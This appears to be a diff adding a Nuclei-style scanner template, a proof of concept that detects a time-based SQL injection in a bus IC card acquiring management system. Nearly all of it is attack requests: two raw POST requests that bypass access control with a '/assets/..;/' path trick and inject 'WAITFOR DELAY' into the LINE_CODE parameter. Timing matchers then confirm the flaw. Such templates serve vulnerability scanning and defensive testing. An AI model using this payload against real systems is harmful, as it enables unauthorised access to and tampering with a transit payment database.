@@ -1,0 +1,37 @@
+id: poc-yaml-bus-ic-card-ams-parametercard-sqli
+info:
+  name: 公交IC卡收单管理系统 parametercard SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 公交IC卡收单管理系统
+
+http:
+  - raw:
+      - |
+        POST /assets/..;/parametercard HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=select&organization=&lineCode=&_search=false&nd=1727249021156&rowCountPerPage=10&pageNo=1&sidx=LINE_CODE&sord=asc&ORGANIZATION_CODE=&LINE_CODE=1');WAITFOR DELAY '0:0:5'--
+      - |
+        POST /assets/..;/parametercard HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=select&organization=&lineCode=&_search=false&nd=1727249021156&rowCountPerPage=10&pageNo=1&sidx=LINE_CODE&sord=asc&ORGANIZATION_CODE=&LINE_CODE=1');WAITFOR DELAY '0:0:8'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "window.top.window.jQuery"
+          - "(\"#temporary_iframe_id\")"
+          - "\"pageCount\":0"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
